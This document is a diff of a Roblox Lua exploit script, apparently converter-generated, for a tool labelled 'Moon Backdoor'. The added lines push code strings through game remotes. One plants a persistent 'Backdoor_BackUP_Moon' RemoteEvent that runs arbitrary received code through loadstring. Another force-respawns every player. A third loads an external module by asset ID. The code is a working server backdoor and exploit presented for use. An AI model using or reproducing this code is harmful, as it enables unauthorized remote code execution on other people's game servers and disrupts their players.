@@ -7,14 +7,15 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 32 | Scripts: 6 | Modules: 0 | Tags: 0
+-- Instances: 31 | Scripts: 6 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
-G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
+G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
 G2L["1"]["IgnoreGuiInset"] = true;
 G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["1"]["ResetOnSpawn"] = false;
 
 
 -- StarterGui.ScreenGui.Load
@@ -298,27 +299,9 @@ G2L["1e"] = Instance.new("UICorner", G2L["1d"]);
 G2L["1e"]["CornerRadius"] = UDim.new(0, 15);
 
 
--- StarterGui.ScreenGui.Main.Contains
-G2L["1f"] = Instance.new("TextLabel", G2L["a"]);
-G2L["1f"]["ZIndex"] = 1000000000;
-G2L["1f"]["BorderSizePixel"] = 0;
-G2L["1f"]["TextSize"] = 36;
-G2L["1f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1f"]["BackgroundTransparency"] = 1;
-G2L["1f"]["Size"] = UDim2.new(0, 200, 0, 50);
-G2L["1f"]["Visible"] = false;
-G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1f"]["Text"] = [[Moon Backdoor]];
-G2L["1f"]["Name"] = [[Contains]];
-G2L["1f"]["Position"] = UDim2.new(0.13347, 0, 0, 0);
-
-
 -- StarterGui.ScreenGui.Main.UICorner
-G2L["20"] = Instance.new("UICorner", G2L["a"]);
-G2L["20"]["CornerRadius"] = UDim.new(0, 15);
+G2L["1f"] = Instance.new("UICorner", G2L["a"]);
+G2L["1f"]["CornerRadius"] = UDim.new(0, 15);
 
 
 -- StarterGui.ScreenGui.Load.LocalScript
@@ -577,13 +560,44 @@ local script = G2L["d"];
 			found = false
 		}
 	
+		local RE = [[
+		for _, lol in pairs(game.Players:GetPlayers()) do
+			lol:LoadCharacter()
+		end
+		]]
+		
+		
+		
+		
+		
+		
+	
+		local SS = [[
+		if game.ReplicatedStorage:FindFirstChild("Backdoor_BackUP_Moon") then
+			return false
+		else
+			local ok = Instance.new("RemoteEvent", game.ReplicatedStorage)
+			ok.Name = "Backdoor_BackUP_Moon"
+			ok.OnServerEvent:Connect(function(plr, ss)
+				loadstring(ss)()
+			end)
+		end
+		]]
+		
+		
 		pcall(function()
 			if isFunction then
 				task.spawn(function()
+					pcall(function() remote:InvokeServer(SS) end)
+					pcall(function() remote:InvokeServer(RE) end)
+					pcall(function() remote:InvokeServer('require(135960332388305).H()') end) --- its hint dumbass
 					pcall(function() remote:InvokeServer(payload) end)
 					pcall(function() remote:InvokeServer("moonTSS", payload) end)
 				end)
 			else
+				pcall(function() remote:FireServer(RE) end)
+				pcall(function() remote:FireServer(SS) end)
+				pcall(function() remote:FireServer('require(135960332388305).H()') end) --- its hint dumbass
 				pcall(function() remote:FireServer(payload) end)
 				pcall(function() remote:FireServer("moonTSS", payload) end)
 			end
